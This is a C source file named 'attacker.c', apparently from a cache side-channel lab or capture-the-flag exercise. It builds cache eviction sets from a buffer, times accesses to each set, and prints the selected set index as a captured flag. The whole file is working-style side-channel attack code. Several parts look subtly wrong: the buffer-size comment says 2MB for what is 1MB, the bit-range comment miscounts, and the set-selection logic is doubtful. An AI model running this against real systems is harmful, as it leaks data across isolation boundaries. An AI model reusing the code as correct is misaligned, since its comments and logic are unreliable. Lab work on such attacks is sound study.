// attacker.c

#include "util.h"
#include <stdio.h>
#include <stdlib.h>

#define BUFF_SIZE (256 * 4096)  // 2MB Hugepage buffer
#define NUM_SETS 2048           // 11 bits of set index (2K sets)
#define PROBES_PER_SET 16
#define SAMPLES 5

int main() {
    uint8_t *buf = (uint8_t *) allocate_buffer();  // ✅ Correct function
    if (buf == NULL) {
        perror("Buffer allocation failed");
        return 1;
    }

    uint8_t *sets[NUM_SETS][PROBES_PER_SET] = {0}; // Initialize to NULL

    // Build eviction sets
    for (int i = 0; i < BUFF_SIZE; i += 64) {  // 64 bytes = cache line
        uint64_t addr = (uint64_t)(buf + i);
        int set = (addr >> 6) & 0x7FF;  // extract bits [6:16) -> 11 bits
        for (int j = 0; j < PROBES_PER_SET; j++) {
            if (sets[set][j] == NULL) {
                sets[set][j] = (uint8_t *) addr;
                break;
            }
        }
    }

    int best_set = -1;
    uint64_t best_latency = 0xFFFFFFFFFFFFFFFF;

    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        if (sets[set_idx][PROBES_PER_SET-1] == NULL) continue; // Not enough addresses

        uint64_t total_time = 0;
        for (int sample = 0; sample < SAMPLES; sample++) {
            for (int probe = 0; probe < PROBES_PER_SET; probe++) {
                total_time += measure_one_block_access_time((uint64_t)sets[set_idx][probe]);  // ✅ Cast pointer to uint64_t
            }
        }

        if (total_time < best_latency) {
            best_latency = total_time;
            best_set = set_idx;
        }
    }

    printf("Captured flag: %d\n", best_set);
    return 0;
}
